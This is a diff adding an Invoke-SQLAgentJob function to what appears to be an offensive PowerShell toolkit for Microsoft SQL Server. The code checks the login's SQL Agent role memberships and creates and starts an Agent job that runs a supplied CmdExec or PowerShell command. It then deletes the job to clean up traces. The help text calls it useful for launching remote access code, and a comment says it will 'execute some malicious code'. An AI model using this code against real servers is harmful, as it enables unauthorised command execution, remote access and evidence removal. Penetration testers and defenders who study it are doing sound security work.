@@ -1225,6 +1225,239 @@ Function  Invoke-SQLOSCmd
 }
 
 # ----------------------------------
+#  Invoke-SQLAgentJob
+# ----------------------------------
+# Author: Leo Loobeek
+Function  Invoke-SQLAgentJob
+{
+    <#
+            .SYNOPSIS
+            Another method to run operating system commands on a Microsoft SQL server by
+            leveraging the SQL Agent Job service. There is not a method to retrieve the output,
+            useful for launching remote access code or sending output through another means.
+
+            Research and SQL code taken from Nick Popovich (@pipefish_) from Optiv.
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance
+            SQL Server instance to connection to.
+            .PARAMETER DAC
+            Connect using Dedicated Admin Connection.
+            .PARAMETER TimeOut
+            Connection time out.
+            .PARAMETER SuppressVerbose
+            Suppress verbose errors.  Used when function is wrapped.
+            .PARAMETER Type
+            The type of Job subsystem to launch. Choices are CmdExec (windows command) or PowerShell.
+            .PARAMETER Command
+            Based on type chosen above, this is the command launched when the job is executed. If nesting PowerShell
+            variables within the command, it will need to be escaped with ` (back tick).
+            .LINK
+            https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution
+            .EXAMPLE
+
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connect using Dedicated Admin Connection.')]
+        [Switch]$DAC,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'Type of subsystem: CmdExec or PowerShell.')]
+        [ValidateSet("CmdExec", "PowerShell")]
+        [string] $Type,
+
+        [Parameter(Mandatory = $true,
+        HelpMessage = 'OS command to be executed.')]
+        [String]$Command,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Connection timeout.')]
+        [string]$TimeOut,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Setup data table for output
+        $TblCommands = New-Object -TypeName System.Data.DataTable
+        $TblResults = New-Object -TypeName System.Data.DataTable
+        $null = $TblResults.Columns.Add('ComputerName')
+        $null = $TblResults.Columns.Add('Instance')
+        $null = $TblResults.Columns.Add('Results')
+
+    }
+
+    Process
+    {
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Setup DAC string
+        if($DAC)
+        {
+            # Create connection object
+            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
+        }
+        else
+        {
+            # Create connection object
+            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
+        }
+        # Attempt connection
+        try
+        {
+            # Open connection
+            $Connection.Open()
+            if(-not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+            }
+
+            # Get some information about current context
+            $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+            $CurrentLogin = $ServerInfo.CurrentLogin
+            $ComputerName = $ServerInfo.ComputerName
+
+            # Check if Agent Job service is running
+            $IsAgentServiceEnabled = Get-SQLQuery -Instance $Instance -Query "SELECT 1 FROM sysprocesses WHERE LEFT(program_name, 8) = 'SQLAgent'" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
+            # See if the SQL Server Agent Service is enabled
+            if ($IsAgentServiceEnabled)
+            {
+                Write-Verbose -Message "$Instance : SQL Server Agent service enabled."
+            }
+            else
+            {
+                # TODO: Find reliable way to start agent service if possible
+                Write-Verbose -Message "$Instance : SQL Server Agent service has not been started. Aborting..."
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'SQL Server Agent service not started.')
+                return
+            }
+
+
+            # https://msdn.microsoft.com/en-us/library/ms188283.aspx
+            # Check to see if member of any SQL Agent roles listed above
+            # It appears, if a user is a member of any of the 3 they should be able to
+            # create and execute local jobs on the SQL server.
+            $AddJobPrivs = Get-SQLDatabaseRoleMember -Username $Username -Password $Password -Instance $Instance -DatabaseName msdb | ForEach-Object { 
+                if($_.RolePrincipalName -match "SQLAgentUserRole|SQLAgentReaderRole|SQLAgentOperatorRole") {
+                    if ($_.PrincipalName -eq $CurrentLogin) { $_ }
+                }
+            }
+
+            if($AddJobPrivs)
+            {
+                Write-Verbose -Message "$Instance : You have EXECUTE privileges to create Agent Jobs (sp_add_job)."
+
+                # Fix single quotes so then can be used within commands ' -> ''
+                $Command = $Command -replace "'","''"
+
+                # Got the privs, let's execute some malicious code!
+                # SQL Query taken from https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution
+                # Author: Nicholas Popovich
+                $JobQuery = "USE msdb; 
+                EXECUTE dbo.sp_add_job 
+                @job_name           = N'powerupsql_job'
+                
+                EXECUTE sp_add_jobstep 
+                @job_name           = N'powerupsql_job',
+                @step_name         = N'powerupsql_job_step', 
+                @subsystem         = N'$Type', 
+                @command           = N'$Command', 
+                @retry_attempts    = 1, 
+                @retry_interval    = 5
+
+                EXECUTE dbo.sp_add_jobserver 
+                @job_name           = N'powerupsql_job'
+                
+                EXECUTE dbo.sp_start_job N'powerupsql_job'"
+
+                $CleanUpQuery = "USE msdb; EXECUTE sp_delete_job @job_name = N'powerupsql_job';"
+
+                # Execute Query
+                Get-SQLQuery -Instance $Instance -Query $JobQuery -Username $Username -Password $Password -Credential $Credential
+                
+                $result = Get-SQLQuery -Instance $Instance -Query "use msdb; EXECUTE sp_help_job @job_name = N'powerupsql_job'" -Username $Username -Password $Password -Credential $Credential
+                
+                if(!($result)) {
+                    Write-Warning "Job failed to start. Recheck your command and try again."
+                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Agent Job failed to start.')
+                    return
+                }
+
+                # Sleep for 5 seconds to ensure job starts, may need to increase or remove this after further testing
+                Write-Verbose "Starting sleep for 5 seconds"
+                Start-Sleep 5
+
+                # Clean up the Job
+                Write-Verbose "$Instance : Removing Job from server"
+                Get-SQLQuery -Instance $Instance -Query $CleanUpQuery -Username $Username -Password $Password -Credential $Credential
+
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'The Job succesfully started and was removed.')
+
+            }
+            else
+            {
+                Write-Verbose -Message "$Instance : You do not have privileges to add Agent Jobs (sp_add_job). Aborting..."
+                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Insufficient privilieges to add Agent Jobs.')
+                return
+            }
+
+            # Close connection
+            $Connection.Close()
+
+            # Dispose connection
+            $Connection.Dispose()
+
+        }
+        catch
+        {
+            # Connection failed
+            if(-not $SuppressVerbose)
+            {
+                $ErrorMessage = $_.Exception.Message
+                Write-Verbose -Message "$Instance : Connection Failed."
+                #Write-Verbose  " Error: $ErrorMessage"
+            }
+            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
+        }
+
+        return $TblResults
+    }
+}
+
+# ----------------------------------
 #  Get-SQLServerInfo
 # ----------------------------------
 # Author: Scott Sutherland
